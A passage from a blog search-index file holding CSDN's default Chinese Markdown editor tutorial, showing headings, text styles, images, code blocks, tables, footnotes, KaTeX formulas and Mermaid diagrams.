title="合理的创建标题，有助于目录的生成"></a>合理的创建标题，有助于目录的生成</h2><p>直接输入1次<kbd>#</kbd>，并按下<kbd>space</kbd>后，将生成1级标题。<br>输入2次<kbd>#</kbd>，并按下<kbd>space</kbd>后，将生成2级标题。<br>以此类推，我们支持6级标题。有助于使用<code>TOC</code>语法后生成一个完美的目录。</p><h2 id="如何改变文本的样式"><a href="#如何改变文本的样式" class="headerlink" title="如何改变文本的样式"></a>如何改变文本的样式</h2><p><em>强调文本</em> <em>强调文本</em></p><p><strong>加粗文本</strong> <strong>加粗文本</strong></p><p>==标记文本==</p><p><del>删除文本</del></p><blockquote><p>引用文本</p></blockquote><p>H<del>2</del>O is是液体。</p><p>2^10^ 运算结果是 1024.</p><h2 id="插入链接与图片"><a href="#插入链接与图片" class="headerlink" title="插入链接与图片"></a>插入链接与图片</h2><p>链接: <a href="https://www.csdn.net/">link</a>.</p><p>图片: <img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9hdmF0YXIuY3Nkbi5uZXQvNy83L0IvMV9yYWxmX2h4MTYzY29tLmpwZw" alt="Alt"></p><p>带尺寸的图片: ![Alt](<a href="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9hdmF0YXIuY3Nkbi5uZXQvNy83L0IvMV9yYWxmX2h4MTYzY29tLmpwZw">https://imgconvert.csdnimg.cn/aHR0cHM6Ly9hdmF0YXIuY3Nkbi5uZXQvNy83L0IvMV9yYWxmX2h4MTYzY29tLmpwZw</a> =30x30)</p><p>居中的图片: <img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9hdmF0YXIuY3Nkbi5uZXQvNy83L0IvMV9yYWxmX2h4MTYzY29tLmpwZw#pic_center" alt="Alt"></p><p>居中并且带尺寸的图片: ![Alt](<a href="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9hdmF0YXIuY3Nkbi5uZXQvNy83L0IvMV9yYWxmX2h4MTYzY29tLmpwZw#pic_center">https://imgconvert.csdnimg.cn/aHR0cHM6Ly9hdmF0YXIuY3Nkbi5uZXQvNy83L0IvMV9yYWxmX2h4MTYzY29tLmpwZw#pic_center</a> =30x30)</p><p>当然，我们为了让用户更加便捷，我们增加了图片拖拽功能。</p><h2 id="如何插入一段漂亮的代码片"><a href="#如何插入一段漂亮的代码片" class="headerlink" title="如何插入一段漂亮的代码片"></a>如何插入一段漂亮的代码片</h2><p>去<a href="https://mp.csdn.net/console/configBlog">博客设置</a>页面，选择一款你喜欢的代码片高亮样式，下面展示同样高亮的 <code>代码片</code>.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// An highlighted block</span><br><span class="hljs-keyword">var</span> foo = <span class="hljs-string">&#x27;bar&#x27;</span>;<br></code></pre></td></tr></table></figure><h2 id="生成一个适合你的列表"><a href="#生成一个适合你的列表" class="headerlink" title="生成一个适合你的列表"></a>生成一个适合你的列表</h2><ul><li>项目<ul><li>项目<ul><li>项目</li></ul></li></ul></li></ul><ol><li>项目1</li><li>项目2</li><li>项目3</li></ol><ul><li><input disabled="" type="checkbox"> 计划任务</li><li><input checked="" disabled="" type="checkbox"> 完成任务</li></ul><h2 id="创建一个表格"><a href="#创建一个表格" class="headerlink" title="创建一个表格"></a>创建一个表格</h2><p>一个简单的表格是这么创建的：<br>项目     | Value<br>——– | —–<br>电脑  | $1600<br>手机  | $12<br>导管  | $1</p><h3 id="设定内容居中、居左、居右"><a href="#设定内容居中、居左、居右" class="headerlink" title="设定内容居中、居左、居右"></a>设定内容居中、居左、居右</h3><p>使用<code>:---------:</code>居中<br>使用<code>:----------</code>居左<br>使用<code>----------:</code>居右<br>| 第一列       | 第二列         | 第三列        |<br>|:———–:| ————-:|:————-|<br>| 第一列文本居中 | 第二列文本居右  | 第三列文本居左 |</p><h3 id="SmartyPants"><a href="#SmartyPants" class="headerlink" title="SmartyPants"></a>SmartyPants</h3><p>SmartyPants将ASCII标点字符转换为“智能”印刷标点HTML实体。例如：<br>|    TYPE   |ASCII                          |HTML<br>|—————-|——————————-|—————————–|<br>|Single backticks|<code>&#39;Isn&#39;t this fun?&#39;</code>            |’Isn’t this fun?’            |<br>|Quotes          |<code>&quot;Isn&#39;t this fun?&quot;</code>            |”Isn’t this fun?”            |<br>|Dashes          |<code>-- is en-dash, --- is em-dash</code>|– is en-dash, — is em-dash|</p><h2 id="创建一个自定义列表"><a href="#创建一个自定义列表" class="headerlink" title="创建一个自定义列表"></a>创建一个自定义列表</h2><dl><dt>Markdown</dt><dd>Text-to-HTML conversion tool</dd></dl><dl><dt>Authors<br>:  John</dt><dd>Luke</dd></dl><h2 id="如何创建一个注脚"><a href="#如何创建一个注脚" class="headerlink" title="如何创建一个注脚"></a>如何创建一个注脚</h2><p>一个具有注脚的文本。<sup id="fnref:2" class="footnote-ref"><a href="#fn:2" rel="footnote"><span class="hint--top hint--rounded" aria-label="注脚的解释"><a href="https://mermaidjs.github.io/">2</a></span></a></sup></p><h2 id="注释也是必不可少的"><a href="#注释也是必不可少的" class="headerlink" title="注释也是必不可少的"></a>注释也是必不可少的</h2><p>Markdown将文本转换为 HTML。</p><p>*[HTML]:   超文本标记语言</p><h2 id="KaTeX数学公式"><a href="#KaTeX数学公式" class="headerlink" title="KaTeX数学公式"></a>KaTeX数学公式</h2><p>您可以使用渲染LaTeX数学表达式 <a href="https://khan.github.io/KaTeX/">KaTeX</a>:</p><p>Gamma公式展示 $\Gamma(n) = (n-1)!\quad\forall<br>n\in\mathbb N$ 是通过欧拉积分</p><p>$$<br>\Gamma(z) = \int_0^\infty t^{z-1}e^{-t}dt,.<br>$$</p><blockquote><p>你可以找到更多关于的信息 <strong>LaTeX</strong> 数学表达式<a href="http://meta.math.stackexchange.com/questions/5020/mathjax-basic-tutorial-and-quick-reference">here</a>.</p></blockquote><h2 id="新的甘特图功能，丰富你的文章"><a href="#新的甘特图功能，丰富你的文章" class="headerlink" title="新的甘特图功能，丰富你的文章"></a>新的甘特图功能，丰富你的文章</h2><pre><code class=" mermaid">gantt        dateFormat  YYYY-MM-DD        title Adding GANTT diagram functionality to mermaid        section 现有任务        已完成               :done,    des1, 2014-01-06,2014-01-08        进行中               :active,  des2, 2014-01-09, 3d        计划一               :         des3, after des2, 5d        计划二               :         des4, after des3, 5d</code></pre><ul><li>关于 <strong>甘特图</strong> 语法，参考 <a href="https://mermaidjs.github.io/">这儿</a>,</li></ul><h2 id="UML-图表"><a href="#UML-图表" class="headerlink" title="UML 图表"></a>UML 图表</h2><p>可以使用UML图表进行渲染。 <a href="https://mermaidjs.github.io/">Mermaid</a>. 例如下面产生的一个序列图：</p><pre><code class=" mermaid">sequenceDiagram张三 -&gt;&gt; 李四: 你好！李四, 最近怎么样?李四--&gt;&gt;王五: 你最近怎么样，王五？李四--x 张三: 我很好，谢谢!李四-x 王五: 我很好，谢谢!Note right of 王五: 李四想了很长时间, 文字太长了&lt;br/&gt;不适合放在一行.李四--&gt;&gt;张三: 打量着王五...张三-&gt;&gt;王五: 很好... 王五, 你怎么样?</code></pre><p>这将产生一个流程图。:</p><pre><code class=" mermaid">graph LRA[长方形] -- 链接 --&gt; B((圆))A --&gt; C(圆角长方形)B --&gt; D&#123;菱形&#125;C --&gt; D</code></pre><ul><li>关于 <strong>Mermaid</strong> 语法，参考 <a href="https://mermaidjs.github.io/">这儿</a>,</li></ul><h2 id="FLowchart流程图"><a href="#FLowchart流程图" class="headerlink" title="FLowchart流程图"></a>FLowchart流程图</h2><p>我们依旧会支持flowchart的流程图：</p><pre><code class=" mermaid">flowchatst=&gt;start: 开始e=&gt;end: 结束op=&gt;operation: 我的操作cond=&gt;condition: 确认？st-&gt;op-&gt;condcond(yes)-&gt;econd(no)-&gt;op</code></pre><ul><li>关于 <strong>Flowchart流程图</strong> 语法，参考 <a href="http://adrai.github.io/flowchart.js/">这儿</a>.</li></ul><h2 id="导出与导入"><a href="#导出与导入" class="headerlink" title="导出与导入"></a>导出与导入</h2><h3 id="导出"><a href="#导出" class="headerlink" title="导出"></a>导出</h3><p>如果你想尝试使用此编辑器, 你可以在此篇文章任意编辑。当你完成了一篇文章的写作, 在上方工具栏找到 <strong>文章导出</strong> ，生成一个.md文件或者.html文件进行本地保存。</p><h3 id="导入"><a href="#导入" class="headerlink" title="导入"></a>导入</h3><p>如果你想加载一篇你写过的.md文件，在上方工具栏可以选择导入功能进行对应扩展名的文件导入，<br>继续你的创作。</p><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span><a href="https://mermaidjs.github.io/">mermaid语法说明</a><a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:2" class="footnote-text"><span>注脚的解释<a href="#fnref:2" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section>]]></content>
    
    
    <categories>
      
      <category>关于Markdown的使用</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Markdown</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
